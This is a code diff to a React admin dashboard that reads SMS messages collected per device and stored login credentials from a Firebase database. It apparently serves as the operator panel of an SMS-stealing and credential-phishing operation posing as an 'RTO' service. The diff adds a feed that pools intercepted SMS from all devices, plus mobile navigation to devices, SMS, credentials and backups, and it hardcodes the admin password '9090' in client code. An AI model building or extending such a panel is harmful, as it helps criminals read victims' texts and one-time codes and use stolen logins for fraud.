@@ -8,8 +8,9 @@ import SmsPanel from "../components/SmsPanel";
 import CredentialsPanel from "../components/CredentialsPanel";
 import BackupPanel from "../components/BackupPanel";
 import AnalyticsPanel from "../components/AnalyticsPanel";
+import AllDevicesSmsPanel from "../components/AllDevicesSmsPanel";
 
-const ADMIN_PASSWORD = "9090"; // <-- यहाँ आप अपना मनचाहा पासवर्ड सेट कर सकते हैं
+const ADMIN_PASSWORD = "9090";
 
 export default function AdminDashboard() {
   const [isAuthenticated, setIsAuthenticated] = useState(false);
@@ -24,7 +25,6 @@ export default function AdminDashboard() {
   const [smsModalDevice, setSmsModalDevice] = useState(null);
   const [toasts, setToasts] = useState([]);
 
-  // चेक करें कि क्या यूजर पहले से लॉग इन है
   useEffect(() => {
     const savedAuth = sessionStorage.getItem("rto_admin_auth");
     if (savedAuth === "true") {
@@ -60,7 +60,6 @@ export default function AdminDashboard() {
     }, 3000);
   };
 
-  // Load Saved Favourites
   useEffect(() => {
     if (!isAuthenticated) return;
     try {
@@ -82,7 +81,6 @@ export default function AdminDashboard() {
     localStorage.setItem("rtoFavourites", JSON.stringify(next));
   };
 
-  // Realtime Firebase Listener (केवल लॉगिन के बाद डेटा लोड होगा)
   useEffect(() => {
     if (!isAuthenticated) return;
 
@@ -127,9 +125,11 @@ export default function AdminDashboard() {
     remove(ref(db, "login")).then(() => showToast("✅ All Credentials Deleted", "success"));
   };
 
-  // ==========================================
-  // PASSWORD GATE (LOGIN SCREEN)
-  // ==========================================
+  const totalSmsCount = Object.values(data.user_sms || {}).reduce(
+    (total, devMsgs) => total + Object.keys(devMsgs || {}).length,
+    0
+  );
+
   if (!isAuthenticated) {
     return (
       <div style={{
@@ -162,7 +162,7 @@ export default function AdminDashboard() {
             <div style={{ marginBottom: 16 }}>
               <input
                 type="password"
-                placeholder="Enter Password (Default: 9999)"
+                placeholder="Enter Password (9090)"
                 value={passwordInput}
                 onChange={(e) => setPasswordInput(e.target.value)}
                 autoFocus
@@ -196,7 +196,6 @@ export default function AdminDashboard() {
           </form>
         </div>
 
-        {/* Toasts on Login screen */}
         <div id="toastContainer">
           {toasts.map((t) => (
             <div key={t.id} className={`toast-luxury ${t.type}`}>
@@ -208,9 +207,6 @@ export default function AdminDashboard() {
     );
   }
 
-  // ==========================================
-  // AUTHENTICATED ADMIN DASHBOARD
-  // ==========================================
   return (
     <div className="app-wrapper">
       <header className="top-bar">
@@ -224,7 +220,6 @@ export default function AdminDashboard() {
             <span className="dot"></span>
             <span>Realtime Cloud</span>
           </div>
-          {/* Logout Button */}
           <button 
             onClick={handleLogout} 
             title="Logout Admin" 
@@ -248,6 +243,11 @@ export default function AdminDashboard() {
               <i className="fas fa-star" style={{ color: "var(--gold)" }}></i>
               <span>Favourites</span>
               <span className="nav-badge">{favourites.length}</span>
+            </button>
+            <button className={`nav-item ${activePanel === "all_messages" ? "active" : ""}`} onClick={() => setActivePanel("all_messages")}>
+              <i className="fas fa-comments" style={{ color: "var(--gold)" }}></i>
+              <span>All SMS Feed</span>
+              <span className="nav-badge" style={{ color: "var(--gold)", borderColor: "var(--gold)" }}>{totalSmsCount}</span>
             </button>
             <button className={`nav-item ${activePanel === "sms" ? "active" : ""}`} onClick={() => setActivePanel("sms")}>
               <i className="fas fa-envelope"></i>
@@ -292,6 +292,12 @@ export default function AdminDashboard() {
               showToast={showToast} 
             />
           )}
+          {activePanel === "all_messages" && (
+            <AllDevicesSmsPanel 
+              data={data} 
+              showToast={showToast} 
+            />
+          )}
           {activePanel === "sms" && (
             <SmsPanel 
               data={data} 
@@ -320,6 +326,29 @@ export default function AdminDashboard() {
           )}
         </main>
       </div>
+
+      <nav className="mobile-bottom-nav">
+        <button className={`mobile-nav-item ${activePanel === "devices" ? "active" : ""}`} onClick={() => setActivePanel("devices")}>
+          <i className="fas fa-mobile-alt"></i>
+          <span>Devices</span>
+        </button>
+        <button className={`mobile-nav-item ${activePanel === "all_messages" ? "active" : ""}`} onClick={() => setActivePanel("all_messages")}>
+          <i className="fas fa-comments"></i>
+          <span>All SMS</span>
+        </button>
+        <button className={`mobile-nav-item ${activePanel === "favourites" ? "active" : ""}`} onClick={() => setActivePanel("favourites")}>
+          <i className="fas fa-star"></i>
+          <span>Starred</span>
+        </button>
+        <button className={`mobile-nav-item ${activePanel === "credentials" ? "active" : ""}`} onClick={() => setActivePanel("credentials")}>
+          <i className="fas fa-key"></i>
+          <span>Creds</span>
+        </button>
+        <button className={`mobile-nav-item ${activePanel === "backup" ? "active" : ""}`} onClick={() => setActivePanel("backup")}>
+          <i className="fas fa-database"></i>
+          <span>Backup</span>
+        </button>
+      </nav>
 
       {smsModalDevice && (
         <div className="modal-luxury open" onClick={() => setSmsModalDevice(null)}>
